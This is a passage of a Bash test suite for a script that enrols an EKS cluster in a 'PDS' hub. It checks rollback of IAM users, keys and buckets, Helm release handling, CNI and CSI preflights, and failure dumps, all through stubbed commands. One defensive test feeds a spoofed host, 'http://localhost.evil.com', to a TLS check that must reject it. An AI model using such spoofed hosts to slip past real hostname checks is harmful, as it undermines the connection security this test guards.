  || fail "on_exit left the minted access key: $(cat "${WORK}/calls")"
grep -q "iam delete-user-policy --user-name pds-spoke-a --policy-name pds-backup-storage" "${WORK}/calls" \
  || fail "on_exit left the inline policy: $(cat "${WORK}/calls")"
grep -q "iam delete-user --user-name pds-spoke-a" "${WORK}/calls" \
  || fail "on_exit left the IAM user this run created: $(cat "${WORK}/calls")"
pass "on_exit deletes an IAM user this run created"

CREATED_IAM_USER=1
INSTALLED_PLATFORM=0
APPLIED_IDENTITY_TO_EXISTING=0
CREATED_ACCESS_KEY_ID="AKIATHISRUN00000000"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIATHISRUN00000000" "${WORK}/calls" \
  || fail "on_exit left an IAM user a new install never applied: $(cat "${WORK}/calls")"
grep -q "iam delete-user --user-name pds-spoke-a" "${WORK}/calls" \
  || fail "on_exit left an IAM user a new install never applied"
pass "on_exit deletes an IAM user a new install never applied"

CREATED_IAM_USER=1
INSTALLED_PLATFORM=0
APPLIED_IDENTITY_TO_EXISTING=1
CREATED_ACCESS_KEY_ID="AKIATHISRUN00000000"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIATHISRUN00000000" "${WORK}/calls" \
  && fail "on_exit deleted a key already written into an existing platform: $(cat "${WORK}/calls")"
grep -q "iam delete-user --user-name pds-spoke-a" "${WORK}/calls" \
  && fail "on_exit deleted an IAM user written into an existing platform"
pass "on_exit keeps an IAM user written into an existing platform"
APPLIED_IDENTITY_TO_EXISTING=0
CREATED_IAM_USER=0
CREATED_ACCESS_KEY_ID=""
INSTALLED_PLATFORM=0

CREATED_BUCKET=1
CREATED_IAM_USER=0
INSTALLED_PLATFORM=0
APPLIED_BUCKET_TO_EXISTING=1
BUCKET="pds-spoke-a"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "s3 rb s3://pds-spoke-a" "${WORK}/calls" \
  && fail "on_exit deleted a bucket already written into an existing platform: $(cat "${WORK}/calls")"
pass "on_exit keeps a bucket written into an existing platform"

CREATED_BUCKET=1
CREATED_IAM_USER=0
INSTALLED_PLATFORM=0
APPLIED_BUCKET_TO_EXISTING=0
BUCKET="pds-spoke-a"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "s3 rb s3://pds-spoke-a" "${WORK}/calls" \
  || fail "on_exit left a bucket this run created and never applied: $(cat "${WORK}/calls")"
pass "on_exit deletes a bucket this run created before Helm used it"

CREATED_BUCKET=0
APPLIED_BUCKET_TO_EXISTING=0
BUCKET=""

CREATED_IAM_USER=0
INSTALLED_PLATFORM=0
APPLIED_IDENTITY_TO_EXISTING=0
CREATED_ACCESS_KEY_ID="AKIATHISRUN00000000"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIATHISRUN00000000" "${WORK}/calls" \
  || fail "on_exit left a key minted on an existing user: $(cat "${WORK}/calls")"
grep -q "iam delete-user --user-name pds-spoke-a" "${WORK}/calls" \
  && fail "on_exit deleted an IAM user this run did not create"
pass "on_exit deletes a key minted on an existing user"

CREATED_IAM_USER=0
INSTALLED_PLATFORM=0
APPLIED_IDENTITY_TO_EXISTING=1
CREATED_ACCESS_KEY_ID="AKIATHISRUN00000000"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIATHISRUN00000000" "${WORK}/calls" \
  && fail "on_exit deleted a minted key already written into an existing platform: $(cat "${WORK}/calls")"
pass "on_exit keeps a minted key written into an existing platform"
APPLIED_IDENTITY_TO_EXISTING=0

CREATED_IAM_USER=0
INSTALLED_PLATFORM=0
CREATED_ACCESS_KEY_ID="AKIATHISRUN00000000"
ON_FAILURE="keep"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIATHISRUN00000000" "${WORK}/calls" \
  && fail "the keep path deleted a key minted on an existing user: $(cat "${WORK}/calls")"
pass "the keep path leaves a key minted on an existing user"
ON_FAILURE="rollback"

CREATED_IAM_USER=0
CREATED_ACCESS_KEY_ID=""
KEPT_ACCESS_KEY_ID="AKIAKEEP0000000000"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIAKEEP0000000000" "${WORK}/calls" \
  && fail "on_exit deleted the previous backup key that must survive a failed run"
pass "on_exit does not retire the previous backup key"

CREATED_IAM_USER=0
CREATED_ACCESS_KEY_ID=""
KEPT_ACCESS_KEY_ID=""

existing_identity="${WORK}/s3-existing.flag"
(
  CREATED_IAM_USER=1
  APPLIED_IDENTITY_TO_EXISTING=0
  PLATFORM_NAMESPACE="everest-system"
  tmp="${WORK}/s3-existing"
  mkdir -p "$tmp"
  platform_installed() { return 0; }
  write_s3_secret "AKIATHISRUN00000000" "secret-this-run"
  printf %s "$APPLIED_IDENTITY_TO_EXISTING" >"$existing_identity"
)
[[ "$(cat "$existing_identity")" == 1 ]] \
  || fail "write_s3_secret did not preserve an IAM user applied to an existing release"
pass "write_s3_secret preserves an IAM user once the Secret is on an existing release"

new_identity="${WORK}/s3-new.flag"
(
  CREATED_IAM_USER=1
  APPLIED_IDENTITY_TO_EXISTING=0
  PLATFORM_NAMESPACE="everest-system"
  tmp="${WORK}/s3-new"
  mkdir -p "$tmp"
  platform_installed() { return 1; }
  write_s3_secret "AKIATHISRUN00000000" "secret-this-run"
  printf %s "$APPLIED_IDENTITY_TO_EXISTING" >"$new_identity"
)
[[ "$(cat "$new_identity")" == 0 ]] \
  || fail "write_s3_secret preserved an IAM user before a new install applied it"
pass "write_s3_secret does not preserve an IAM user on a new install"
minted_identity="${WORK}/s3-minted.flag"
(
  CREATED_IAM_USER=0
  CREATED_ACCESS_KEY_ID="AKIATHISRUN00000000"
  APPLIED_IDENTITY_TO_EXISTING=0
  PLATFORM_NAMESPACE="everest-system"
  tmp="${WORK}/s3-minted"
  mkdir -p "$tmp"
  platform_installed() { return 0; }
  write_s3_secret "AKIATHISRUN00000000" "secret-this-run"
  printf %s "$APPLIED_IDENTITY_TO_EXISTING" >"$minted_identity"
)
[[ "$(cat "$minted_identity")" == 1 ]] \
  || fail "write_s3_secret did not preserve a minted key on an existing release"
pass "write_s3_secret preserves a minted key once the Secret is on an existing release"
# A spoke whose platform was installed before the product was renamed to PDS
# holds the release under the old name. Reconciling that release is the repair;
# installing beside it leaves two adapters beating for the same cluster.
cat >"${FAKE}/helm" <<'EOF'
#!/usr/bin/env bash
if [[ "$1" == "status" ]]; then
  case " ${FAKE_DEPLOYED_RELEASES:-} " in
    *" $2 "*) echo '{"info":{"status":"deployed"}}'; exit 0 ;;
  esac
  exit 1
fi
exit 0
EOF
chmod +x "${FAKE}/helm"

PLATFORM_NAMESPACE="everest-system"

PLATFORM_RELEASE="pds"
PLATFORM_RELEASE_NAMED=0
export FAKE_DEPLOYED_RELEASES="percona-services" # allow-legacy-name
resolve_platform_release >/dev/null
unset FAKE_DEPLOYED_RELEASES
want="percona-services" # allow-legacy-name
[[ "$PLATFORM_RELEASE" == "$want" ]] \
  || fail "resolve_platform_release installed beside a release from before the rename: ${PLATFORM_RELEASE}"
pass "resolve_platform_release reconciles a release from before the rename"

PLATFORM_RELEASE="pds"
PLATFORM_RELEASE_NAMED=0
export FAKE_DEPLOYED_RELEASES="pds percona-services" # allow-legacy-name
resolve_platform_release >/dev/null
unset FAKE_DEPLOYED_RELEASES
[[ "$PLATFORM_RELEASE" == "pds" ]] \
  || fail "resolve_platform_release preferred the old release: ${PLATFORM_RELEASE}"
pass "resolve_platform_release prefers the current release when both exist"

PLATFORM_RELEASE="pds"
PLATFORM_RELEASE_NAMED=0
export FAKE_DEPLOYED_RELEASES=""
resolve_platform_release >/dev/null
unset FAKE_DEPLOYED_RELEASES
[[ "$PLATFORM_RELEASE" == "pds" ]] \
  || fail "resolve_platform_release invented a release on a fresh cluster: ${PLATFORM_RELEASE}"
pass "resolve_platform_release installs fresh under the current name"

PLATFORM_RELEASE="mine"
PLATFORM_RELEASE_NAMED=1
export FAKE_DEPLOYED_RELEASES="percona-services" # allow-legacy-name
resolve_platform_release >/dev/null
unset FAKE_DEPLOYED_RELEASES
[[ "$PLATFORM_RELEASE" == "mine" ]] \
  || fail "resolve_platform_release overrode a release the operator named: ${PLATFORM_RELEASE}"
pass "resolve_platform_release leaves a release the operator named alone"

PLATFORM_RELEASE="pds"
PLATFORM_RELEASE_NAMED=0

CREATED_IAM_USER=0
APPLIED_IDENTITY_TO_EXISTING=0
CREATED_ACCESS_KEY_ID=""

cat >"${FAKE}/helm" <<EOF
#!/usr/bin/env bash
echo "helm \$*" >>"${WORK}/calls"
exit 1
EOF
chmod +x "${FAKE}/helm"

# install_platform exits on a Helm failure, and the call discards stdout, so
# an EXIT trap cannot print the flag. Write it to a file instead.
existing_file="${WORK}/plat-existing.flag"
(
  INSTALLED_PLATFORM=0
  trap 'printf %s "$INSTALLED_PLATFORM" >"'"$existing_file"'"' EXIT
  platform_installed() { return 0; }
  ensure_storage() { :; }
  NAME="spoke-a"
  LOCAL=1
  IMAGE_REPOSITORY="ghcr.io/percona/adapter"
  IMAGE_TAG="dev"
  CHART_REF="oci://example.invalid/pds"
  CHART_VERSION="0.0.0"
  HUB_URL="https://hub.example"
  TOKEN="jnt_x"
  PLATFORM_RELEASE="pds"
  PLATFORM_NAMESPACE="everest-system"
  tmp="${WORK}/plat-existing"
  mkdir -p "$tmp"
  install_platform >/dev/null 2>&1
) || true
existing_flag="$(cat "$existing_file" 2>/dev/null || true)"
[[ "$existing_flag" == 0 ]] \
  || fail "INSTALLED_PLATFORM was set for a release that already existed: ${existing_flag}"
pass "install_platform does not mark a pre-existing Helm release for uninstall"

new_file="${WORK}/plat-new.flag"
(
  INSTALLED_PLATFORM=0
  trap 'printf %s "$INSTALLED_PLATFORM" >"'"$new_file"'"' EXIT
  platform_installed() { return 1; }
  ensure_storage() { :; }
  NAME="spoke-a"
  LOCAL=1
  IMAGE_REPOSITORY="ghcr.io/percona/adapter"
  IMAGE_TAG="dev"
  CHART_REF="oci://example.invalid/pds"
  CHART_VERSION="0.0.0"
  HUB_URL="https://hub.example"
  TOKEN="jnt_x"
  PLATFORM_RELEASE="pds"
  PLATFORM_NAMESPACE="everest-system"
  tmp="${WORK}/plat-new"
  mkdir -p "$tmp"
  install_platform >/dev/null 2>&1
) || true
new_flag="$(cat "$new_file" 2>/dev/null || true)"
[[ "$new_flag" == 1 ]] \
  || fail "INSTALLED_PLATFORM was not set for a release this run created: ${new_flag}"
pass "install_platform marks a new Helm release for uninstall on failure"

HUB_URL="https://hub.example"
require_hub_tls
HUB_URL="http://127.0.0.1:18081"
require_hub_tls
HUB_URL="http://localhost:18080"
require_hub_tls
pass "require_hub_tls accepts https and loopback http"

( HUB_URL="http://hub.example" require_hub_tls ) >/dev/null 2>&1 \
  && fail "require_hub_tls accepted a cleartext hub"
( HUB_URL="http://localhost.evil.com" require_hub_tls ) >/dev/null 2>&1 \
  && fail "require_hub_tls accepted a localhost prefix"
pass "require_hub_tls rejects cleartext hubs before enrollment"

# The connected-cluster release names these itself. Leaving one to the chart
# default lets a later default drop it on the next install, and on a re-run
# that only reused what the release had stored.
assert_connected_cluster_values() {
  local file="$1"
  local missing=""
  require_exact() {
    local want="$1" name="$2"
    grep -qxF "$want" "$file" || missing="${missing} ${name}"
  }
  require_next() {
    local head="$1" want="$2" name="$3"
    grep -A1 -xF "$head" "$file" | grep -qxF "$want" || missing="${missing} ${name}"
  }
  require_next "stack:" "  enabled: true" "stack.enabled"
  require_exact "  role: agent" "adapter.role"
  require_exact "  everestURL: http://everest.everest-system.svc.cluster.local:8080" "adapter.everestURL"
  require_next "ui:" "  enabled: false" "ui.enabled"
  require_next "  database:" "    enabled: false" "adapter.database.enabled"
  grep -qE '^    environmentName: ".+"$' "$file" || missing="${missing} adapter.hub.environmentName"
  grep -q 'clusterName' "$file" && missing="${missing} (the deprecated adapter.hub.clusterName is still written)" # allow-legacy-name
  require_next "    operator:" "      enabled: false" "adapter.database.operator.enabled"
  [[ -z "${missing}" ]] || fail "connected-cluster values missing from ${file}:${missing}"
}

: >"${WORK}/calls"
(
  trap - EXIT
  ensure_storage() { echo "ensure_storage called" >>"${WORK}/calls"; }
  platform_installed() { return 1; }
  NAME="spoke-a"
  LOCAL=1
  DB_NAMESPACE="db-apps"
  IMAGE_REPOSITORY="ghcr.io/percona/adapter"
  IMAGE_TAG="dev"
  CHART_REF="oci://example.invalid/pds"
  CHART_VERSION="0.0.0"
  HUB_URL="https://hub.example"
  TOKEN="jnt_x"
  PLATFORM_RELEASE="pds"
  PLATFORM_NAMESPACE="everest-system"
  tmp="${WORK}/plat-local"
  mkdir -p "$tmp"
  install_platform >/dev/null 2>&1 || true
) || true
if grep -q "ensure_storage called" "${WORK}/calls"; then
  fail "install_platform --local still ran EKS storage setup"
fi
grep -q 'everestNamespace: "db-apps"' "${WORK}/plat-local/spoke.yaml" \
  || fail "install_platform ignored the enrolled database namespace"
grep -q 'dbNamespace: "db-apps"' "${WORK}/plat-local/spoke.yaml" \
  || fail "install_platform did not set stack.dbNamespace"
assert_connected_cluster_values "${WORK}/plat-local/spoke.yaml"
pass "install_platform --local skips EKS storage and uses the enrolled namespace"

for node_arches in "amd64 amd64" "arm64 amd64" "arm64" ""; do
  (
    trap - EXIT
    kubectl() {
      if [[ "$*" == *"nodeInfo.architecture"* ]]; then
        [[ -n "$node_arches" ]] || return 1
        printf '%s' "$node_arches"
      fi
    }
    ensure_storage() { :; }
    platform_installed() { return 1; }
    NAME="spoke-a"
    LOCAL=1
    DB_NAMESPACE="db-apps"
    IMAGE_REPOSITORY="ghcr.io/percona/adapter"
    IMAGE_TAG="dev"
    CHART_REF="oci://example.invalid/pds"
    CHART_VERSION="0.0.0"
    HUB_URL="https://hub.example"
    TOKEN="jnt_x"
    PLATFORM_RELEASE="pds"
    PLATFORM_NAMESPACE="everest-system"
    tmp="${WORK}/plat-pmm"
    mkdir -p "$tmp"
    rm -f "$tmp/spoke.yaml"
    install_platform >"${WORK}/pmm-out" 2>&1 || true
  ) || true
  want=true
  [[ "$node_arches" == "arm64" ]] && want=false
  got="$(awk '/^  pmm:/ { getline; print $2; exit }' "${WORK}/plat-pmm/spoke.yaml")"
  [[ "$got" == "$want" ]] \
    || fail "install_platform set stack.pmm.enabled=${got} on nodes '${node_arches}', want ${want}: $(tail -3 "${WORK}/pmm-out")"
  # Flux installs the PMM server from hub Git. The release keeps the rest of
  # the PMM wiring and only drops the subchart.
  if [[ "$want" == true ]]; then
    grep -q '^    subchart: false$' "${WORK}/plat-pmm/spoke.yaml" \
      || fail "install_platform left the PMM subchart on although Flux installs PMM: $(cat "${WORK}/plat-pmm/spoke.yaml")"
  fi
done
pass "install_platform installs PMM unless the cluster has no amd64 node"

cat >"${FAKE}/helm" <<EOF
#!/usr/bin/env bash
echo "helm \$*" >>"${WORK}/calls"
exit 0
EOF
chmod +x "${FAKE}/helm"

: >"${WORK}/calls"
(
  trap - EXIT
  platform_installed() { return 0; }
  ensure_storage() { :; }
  NAME="spoke-a"
  LOCAL=1
  IMAGE_REPOSITORY="ghcr.io/percona/adapter"
  IMAGE_TAG="dev"
  CHART_REF="oci://example.invalid/pds"
  CHART_VERSION="0.0.0"
  HUB_URL="https://hub.example"
  TOKEN="agt_repair"
  PLATFORM_RELEASE="pds"
  PLATFORM_NAMESPACE="everest-system"
  tmp="${WORK}/plat-reuse"
  mkdir -p "$tmp"
  install_platform >/dev/null
)
grep -q -- '--reuse-values' "${WORK}/calls" \
  || fail "install_platform did not reuse values for an existing Helm release: $(cat "${WORK}/calls")"
grep -- '--reuse-values' "${WORK}/calls" | grep -q -- '-f ' \
  || fail "install_platform reused values without passing the release values file: $(cat "${WORK}/calls")"
grep -q 'agentToken: "agt_repair"' "${WORK}/plat-reuse/spoke.yaml" \
  || fail "install_platform dropped the enrolled agent token"
assert_connected_cluster_values "${WORK}/plat-reuse/spoke.yaml"
pass "install_platform reuses Helm values on a repair"

: >"${WORK}/calls"
(
  trap - EXIT
  platform_installed() { return 1; }
  ensure_storage() { :; }
  NAME="spoke-a"
  LOCAL=1
  IMAGE_REPOSITORY="ghcr.io/percona/adapter"
  IMAGE_TAG="dev"
  CHART_REF="oci://example.invalid/pds"
  CHART_VERSION="0.0.0"
  HUB_URL="https://hub.example"
  TOKEN="agt_new"
  PLATFORM_RELEASE="pds"
  PLATFORM_NAMESPACE="everest-system"
  tmp="${WORK}/plat-fresh"
  mkdir -p "$tmp"
  install_platform >/dev/null
)
if grep -q -- '--reuse-values' "${WORK}/calls"; then
  fail "install_platform reused values on a fresh Helm install: $(cat "${WORK}/calls")"
fi
assert_connected_cluster_values "${WORK}/plat-fresh/spoke.yaml"
pass "install_platform does not reuse values on a fresh install"

# Helm 4 redefined a bare --wait as the watcher strategy, which waits on every
# resource including CustomResourceDefinitions. CRDs never report ready there,
# so a platform install that lays down operator CRDs burns the whole timeout.
# The install has to ask for the legacy strategy when it is talking to Helm 4,
# and keep the plain flag on Helm 3, which has no strategies at all.
helm_version_fake() {
  cat >"${FAKE}/helm" <<EOF
#!/usr/bin/env bash
if [ "\$1" = "version" ]; then
  echo "$1"
  exit 0
fi
if [ "\$1" = "upgrade" ] && [ "\$2" = "--help" ]; then
  case "$1" in v4*) echo "      --force-conflicts   force server-side apply" ;; esac
  exit 0
fi
echo "helm \$*" >>"${WORK}/calls"
exit 0
EOF
  chmod +x "${FAKE}/helm"
}

run_install_platform() {
  : >"${WORK}/calls"
  (
    trap - EXIT
    platform_installed() { return 1; }
    ensure_storage() { :; }
    NAME="spoke-a"
    LOCAL=1
    IMAGE_REPOSITORY="ghcr.io/percona/adapter"
    IMAGE_TAG="dev"
    CHART_REF="oci://example.invalid/pds"
    CHART_VERSION="0.0.0"
    HUB_URL="https://hub.example"
    TOKEN="agt_wait"
    PLATFORM_RELEASE="pds"
    PLATFORM_NAMESPACE="everest-system"
    tmp="${WORK}/$1"
    mkdir -p "$tmp"
    install_platform >/dev/null
  )
}

helm_version_fake "v4.2.4+g3900f43"
run_install_platform plat-wait-4
grep -q -- '--wait=legacy' "${WORK}/calls" \
  || fail "install_platform did not ask Helm 4 for the legacy wait strategy: $(cat "${WORK}/calls")"
pass "install_platform asks Helm 4 for the legacy wait strategy"
grep -q -- '--force-conflicts' "${WORK}/calls" \
  || fail "install_platform did not force server-side apply conflicts on Helm 4: $(cat "${WORK}/calls")"
pass "install_platform forces apply conflicts on Helm 4, where an operator owns a Service selector"

helm_version_fake "v3.17.0+gd7c0c5c"
run_install_platform plat-wait-3
grep -q -- '--wait' "${WORK}/calls" \
  || fail "install_platform dropped --wait on Helm 3: $(cat "${WORK}/calls")"
if grep -q -- '--wait=legacy' "${WORK}/calls"; then
  fail "install_platform passed a Helm 4 wait strategy to Helm 3: $(cat "${WORK}/calls")"
fi
pass "install_platform keeps the plain wait flag on Helm 3"
if grep -q -- '--force-conflicts' "${WORK}/calls"; then
  fail "install_platform passed --force-conflicts to Helm 3: $(cat "${WORK}/calls")"
fi
pass "install_platform leaves --force-conflicts off on Helm 3"

# A managed node group joins a cluster that already has a CNI. Without one the
# kubelets register and never go Ready, so eksctl waits out its whole window
# and CloudFormation then cancels the stack, taking a healthy control plane
# down with it. Checking first turns twenty-odd wasted minutes into a sentence.
: >"${WORK}/calls"
(
  trap - EXIT
  NAME="spoke-a"
  REGION="us-west-2"
  aws() {
    if [ "$3" = "describe-addon" ] || [ "$2" = "describe-addon" ]; then return 1; fi
    return 1
  }
  kubectl() { return 1; }
  if require_cluster_cni 2>"${WORK}/cni.err"; then
    echo "require_cluster_cni accepted a cluster with no CNI" >>"${WORK}/calls"
  fi
)
grep -q "accepted a cluster with no CNI" "${WORK}/calls" \
  && fail "require_cluster_cni accepted a cluster with no CNI"
grep -q "has no CNI" "${WORK}/cni.err" \
  || fail "require_cluster_cni did not name the missing CNI: $(cat "${WORK}/cni.err")"
pass "require_cluster_cni rejects a cluster with no CNI before the node group waits"

: >"${WORK}/calls"
(
  trap - EXIT
  NAME="spoke-a"
  REGION="us-west-2"
  aws() { return 0; }
  kubectl() { return 1; }
  require_cluster_cni 2>/dev/null || echo "rejected" >>"${WORK}/calls"
)
grep -q "rejected" "${WORK}/calls" \
  && fail "require_cluster_cni rejected a cluster whose vpc-cni addon is installed"
pass "require_cluster_cni accepts the vpc-cni addon"

: >"${WORK}/calls"
(
  trap - EXIT
  NAME="spoke-a"
  REGION="us-west-2"
  aws() { return 1; }
  kubectl() { return 0; }
  require_cluster_cni 2>/dev/null || echo "rejected" >>"${WORK}/calls"
)
grep -q "rejected" "${WORK}/calls" \
  && fail "require_cluster_cni rejected a self-managed aws-node daemonset"
pass "require_cluster_cni accepts a self-managed CNI daemonset"

# A failed run deletes the cluster it created, and with it every trace of why
# it failed. Three separate diagnoses in one session were lost that way. The
# teardown prints what the platform namespace looked like first, so the reason
# survives in the operator's terminal even though the cluster does not.
: >"${WORK}/calls"
(
  trap - EXIT
  PLATFORM_NAMESPACE="everest-system"
  kubectl() { echo "kubectl $*" >>"${WORK}/calls"; }
  dump_failure_state 2>/dev/null
)
grep -q "get pods" "${WORK}/calls" \
  || fail "dump_failure_state did not list pods: $(cat "${WORK}/calls")"
grep -q "everest-system" "${WORK}/calls" \
  || fail "dump_failure_state did not look at the platform namespace"
grep -q "events" "${WORK}/calls" \
  || fail "dump_failure_state did not collect events"
pass "dump_failure_state reports pods and events before the teardown"

: >"${WORK}/calls"
(
  trap - EXIT
  PLATFORM_NAMESPACE=""
  kubectl() { echo "kubectl $*" >>"${WORK}/calls"; }
  dump_failure_state 2>/dev/null
)
if [[ -s "${WORK}/calls" ]]; then
  fail "dump_failure_state ran kubectl with no platform namespace: $(cat "${WORK}/calls")"
fi
pass "dump_failure_state stays quiet with no namespace to look at"

# The agent reports Ready only after it has really reached the hub, and it
# retries with a backoff that doubles to five minutes. Waiting three minutes
# for that rollout is shorter than one maximum retry interval, so a spoke whose
# first beats fail is torn down while it is still waiting to try again. The
# wait has to outlast the backoff.
: >"${WORK}/calls"
(
  trap - EXIT
  PLATFORM_NAMESPACE="everest-system"
  PLATFORM_RELEASE="pds"
  kubectl() { echo "kubectl $*" >>"${WORK}/calls"; }
  agent_rollout_wait >/dev/null 2>&1 || true
  echo "timeout=$(agent_rollout_timeout)" >>"${WORK}/calls"
)
timeout_value="$(grep -o 'timeout=.*' "${WORK}/calls" | tail -1 | cut -d= -f2)"
case "$timeout_value" in
  *m) minutes="${timeout_value%m}" ;;
  *) minutes=0 ;;
esac
[[ "$minutes" -ge 6 ]] \
  || fail "the agent rollout wait must outlast the five minute heartbeat backoff, got ${timeout_value}"
pass "agent rollout wait outlasts the heartbeat backoff"

: >"${WORK}/calls"
(
  trap - EXIT
  ROLLOUT_TIMEOUT="20m"
  echo "timeout=$(agent_rollout_timeout)" >>"${WORK}/calls"
)
grep -q "timeout=20m" "${WORK}/calls" \
  || fail "agent_rollout_timeout ignored ROLLOUT_TIMEOUT: $(cat "${WORK}/calls")"
pass "agent rollout wait honours ROLLOUT_TIMEOUT"

# Pods and events say a probe failed; only the agent's own log says why it
# could not reach the hub. The dump carries its last lines so a torn down
# cluster still explains itself.
: >"${WORK}/calls"
(
  trap - EXIT
  PLATFORM_NAMESPACE="everest-system"
  PLATFORM_RELEASE="pds"
  kubectl() { echo "kubectl $*" >>"${WORK}/calls"; }
  dump_failure_state 2>/dev/null
)
grep -q "logs" "${WORK}/calls" \
  || fail "dump_failure_state did not collect adapter logs: $(cat "${WORK}/calls")"
grep -q "pds-adapter" "${WORK}/calls" \
  || fail "dump_failure_state did not name the adapter deployment"
pass "dump_failure_state carries the agent log"

# A run that gives up before its kubeconfig is written leaves kubectl with no
# cluster to talk to, and every call below falls back to localhost:8080. That
# output names a port inside the cluster and reads like a component there is
# broken, so the dump has to say what actually happened instead of printing it.
: >"${WORK}/calls"
(
  trap - EXIT
  PLATFORM_NAMESPACE="everest-system"
  PLATFORM_RELEASE="pds"
  kubectl() {
    echo "kubectl $*" >>"${WORK}/calls"
    [[ "$1" != "config" ]]
  }
  dump_failure_state 2>"${WORK}/dump.out"
)
grep -q "get pods" "${WORK}/calls" \
  && fail "dump_failure_state read the cluster with no kubeconfig: $(cat "${WORK}/calls")"
grep -q "logs" "${WORK}/calls" \
  && fail "dump_failure_state asked for logs with no kubeconfig: $(cat "${WORK}/calls")"
grep -q "no Kubernetes cluster" "${WORK}/dump.out" \
  || fail "dump_failure_state did not say there was no cluster: $(cat "${WORK}/dump.out")"
pass "dump_failure_state says so rather than printing connection refused"

cat >"${FAKE}/helm" <<EOF
#!/usr/bin/env bash
echo "helm \$*" >>"${WORK}/calls"
exit 0
EOF
chmod +x "${FAKE}/helm"

chart_dir="${WORK}/preflight-chart"
mkdir -p "$chart_dir"
printf 'name: pds\nversion: 0.0.0\n' >"${chart_dir}/Chart.yaml"
cat >"${FAKE}/helm" <<EOF
#!/usr/bin/env bash
echo "helm \$*" >>"${WORK}/calls"
exit 0
EOF
chmod +x "${FAKE}/helm"

: >"${WORK}/calls"
CHART_DEPS_UPDATED=""
update_chart_dependencies "$chart_dir"
grep -q "helm dependency update ${chart_dir}" "${WORK}/calls" \
  || fail "update_chart_dependencies did not run helm dependency update: $(cat "${WORK}/calls")"
: >"${WORK}/calls"
update_chart_dependencies "$chart_dir"
if grep -q "dependency update" "${WORK}/calls"; then
  fail "update_chart_dependencies repeated helm dependency update: $(cat "${WORK}/calls")"
fi
pass "update_chart_dependencies runs once per chart path"

: >"${WORK}/calls"
(
  trap - EXIT
  find_local_chart() { printf '%s' "$chart_dir"; }
  download_hub_chart() { return 1; }
  PDS_CHART_OCI=""
  CHART_DEPS_UPDATED=""
  tmp="${WORK}/resolve-chart"
  mkdir -p "$tmp"
  resolve_chart >/dev/null
)
grep -q "helm dependency update ${chart_dir}" "${WORK}/calls" \
  || fail "resolve_chart did not update chart dependencies before install: $(cat "${WORK}/calls")"
pass "resolve_chart updates local chart dependencies during preflight"

if grep -E '^[[:space:]]+install_agent([[:space:]]|$)' "${SCRIPT}"; then
  fail "main flow still deploys a sidecar agent after the chart adapter"
fi
pass "join does not install a sidecar agent beside the chart adapter"

grep -q 'NODE_TYPE="${NODE_TYPE:-t3.2xlarge}"' "${SCRIPT}" \
  || fail "default node type cannot schedule Prod: $(grep NODE_TYPE= "${SCRIPT}" | head -1)"
pass "default node type can schedule Prod"

grep -q 'NODES="${NODES:-4}"' "${SCRIPT}" \
  || fail "default node count cannot fit Dev, Staging, and Prod: $(grep '^NODES=' "${SCRIPT}")"
pass "default node count fits Dev, Staging, and Prod"

NAME="spoke-a"
REGION="us-west-2"
NODEGROUP="ng-1"
CREATED_CLUSTER=0
CREATED_NODEGROUP=0
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
ensure_cluster >/dev/null
grep -q "eksctl create nodegroup" "${WORK}/calls" \
  && fail "ensure_cluster created a node group that already existed: $(cat "${WORK}/calls")"
[[ "$CREATED_NODEGROUP" == 0 ]] \
  || fail "ensure_cluster marked a pre-existing node group for cleanup"
pass "ensure_cluster leaves an existing node group for the readiness wait"

write_nodegroup_config() { :; }
export FAKE_MISSING_NODEGROUPS="ng-1"
CREATED_NODEGROUP=0
: >"${WORK}/calls"
ensure_cluster >/dev/null
grep -q "eksctl create nodegroup" "${WORK}/calls" \
  || fail "ensure_cluster did not create an absent node group: $(cat "${WORK}/calls")"
[[ "$CREATED_NODEGROUP" == 1 ]] \
  || fail "ensure_cluster did not mark a node group this run created"
pass "ensure_cluster creates an absent node group"
unset FAKE_MISSING_NODEGROUPS
CREATED_NODEGROUP=0

NAME="spoke-a"
REGION="us-west-2"
: >"${WORK}/calls"
if (
  ensure_ebs_csi_iam() { CSI_ROLE_ARN="arn:aws:iam::123456789012:role/AmazonEKS_EBS_CSI_DriverRole_spoke-a"; }
  kubectl() {
    echo "kubectl $*" >>"${WORK}/calls"
    case "$*" in
      *"get csidriver"*) return 1 ;;
      *) return 0 ;;
    esac
  }
  eksctl() {
    echo "eksctl $*" >>"${WORK}/calls"
    return 1
  }
  ensure_storage >/dev/null
); then
  fail "ensure_storage succeeded when the CSI addon failed"
fi
grep -q "eksctl create addon --name aws-ebs-csi-driver" "${WORK}/calls" \
  || fail "ensure_storage did not try to install the CSI addon: $(cat "${WORK}/calls")"
grep -q -- "--service-account-role-arn" "${WORK}/calls" \
  || fail "ensure_storage created the CSI addon without the IRSA role: $(cat "${WORK}/calls")"
pass "ensure_storage fails when the CSI addon cannot install"

: >"${WORK}/calls"
if (
  ensure_ebs_csi_iam() { :; }
  kubectl() {
    echo "kubectl $*" >>"${WORK}/calls"
    case "$*" in
      *"get csidriver"*) return 0 ;;
      *"rollout status"*ebs-csi-controller*) return 1 ;;
      *"apply"*)
        cat >/dev/null
        return 0
        ;;
      *) return 0 ;;
    esac
  }
  eksctl() { echo "eksctl $*" >>"${WORK}/calls"; return 0; }
  ensure_storage >/dev/null
); then
  fail "ensure_storage succeeded while the CSI controller was unready"
fi
